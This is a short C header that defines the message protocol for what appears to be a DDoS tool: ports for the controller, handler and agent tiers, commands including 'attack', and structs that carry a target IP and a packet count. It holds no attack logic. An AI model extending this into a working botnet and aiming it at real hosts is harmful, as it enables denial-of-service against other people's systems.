#ifndef DDOS_H
#define DDOS_H

#include <arpa/inet.h>

/* Ports */
#define DDOS_CTRL_CLT_PORT 2002

#define DDOS_HANDL_CLT_PORT 3003
#define DDOS_HANDL_SRV_PORT 4004

#define DDOS_AGENT_SRV_PORT 5005

typedef enum
{
    DDOS_CMD_ADD_AGENT = 1,
    DDOS_CMD_INTERROGATE_HANDLER = 2,
    DDOS_CMD_INTERROGATE_AGENTS = 3,
    DDOS_CMD_ATTACK = 4,
}ddos_cmd_t;

typedef enum
{
    DDOS_OK = 1,
    DDOS_ERROR = 2,
}ddos_status_t;

typedef struct
{
    ddos_cmd_t cmd;
    char ip[INET_ADDRSTRLEN];
    int pkts;
} ddos_request_t;

typedef struct
{
    ddos_status_t status;
    int data;
} ddos_responce_t;

typedef struct 
{
    char *target_ip;
    int pkts;
}attack_data_t;

#endif /* DDOS_H */
